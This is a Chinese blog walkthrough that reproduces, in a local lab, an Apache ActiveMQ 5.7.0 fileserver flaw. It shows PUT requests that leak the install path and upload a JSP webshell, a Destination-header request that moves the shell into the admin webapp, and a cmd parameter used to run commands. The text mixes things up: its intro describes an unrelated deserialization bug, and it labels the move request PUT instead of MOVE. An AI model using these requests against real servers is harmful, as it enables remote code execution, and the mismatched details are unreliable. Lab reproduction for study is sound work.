---
title: Apache activeMQ漏洞复现put和move方法
tags:
  - 漏洞复现
categories:
  - 漏洞复现
copyright: true
abbrlink: 53911d20
date: 2019-04-19 17:59:47
---
漏洞说明  
Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring
Framework等。Apache ActiveMQ
5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。  
1、ActiveMQ默认开启PUT MOVE等不安全的http方法  
2、ActiveMQ的file server允许客户通过PUT上传文件

环境搭建  
window 7 IP地址为192.168.17.173  
配置java环境变量，下载jre  
[
https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html
](https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html)  
双击运行一路下一步，然后配置环境变量。  
可参考https://jingyan.baidu.com/article/6dad5075d1dc40a123e36ea3.html

下载有漏洞版本的ActiveMQ，这里下载的是5.7.0  
地址为http://activemq.apache.org/download-archives.html  
解压打开进入bin目录双击activemq启动  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190419175222729.png)
访问http://192.168.17.173:8161/admin/  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190419175316600.png)
自此环境搭建成功  
打开Burp suite抓包  
PUT /fileserver/a…/…/%08/…%08/.%08/%08 HTTP/1.1  
爆出绝对路径  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190419175613996.png)  
写入jsp代码  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190419175722297.png)
移动  
上传shell时，file server中是没有执行权限的，需要移动到admin中才能执行shell  
PUT /fileserver/test.jsp HTTP/1.1  
Destination: file:C:/Users/ruan/Desktop/apache-
activemq-5.7.0/webapps/admin/test.jsp

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190419175842719.png)
访问http://192.168.17.173:8161/admin/test.jsp?cmd=calc

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190419175852493.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190419175933147.png)

